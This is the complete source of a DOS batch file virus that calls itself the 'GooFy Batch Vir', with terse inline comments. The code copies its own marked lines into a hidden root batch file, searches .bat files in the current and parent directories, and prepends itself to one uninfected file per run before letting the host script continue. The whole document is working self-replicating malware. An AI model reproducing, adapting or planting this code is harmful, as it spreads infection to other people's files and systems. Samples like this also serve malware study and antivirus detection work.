@echo off%[GooFy]%
if '%1==' 42! goto GooFy%2
if exist \GooFy_.Bat goto GooFyRun
if not exist %0.bat goto GooFyOut
find "GooFy"<%0.bat>\GooFy_.Bat
:GooFyRun Root Bat in a shell
command /c \GooFy_.Bat 42! Vir
goto GooFyOut and run the host
:GooFyVir Looks for BATs in current and parent
for %%a in (*.bat ..\*.bat) do call %0 42! GooFy %%a
exit GooFy without doing anything
:GooFyGooFy Only works with DOS 6
find "GooFy"<%3>nul.amIhere?
if not errorlevel 1 goto GooFyOut
type \GooFy_.bat>GooFy$
type %3>>GooFy$
move GooFy$ %3>nul
exit GooFy after infecting one batch
:GooFyOut *** the GooFy Batch Vir ***
::--- and here's your host...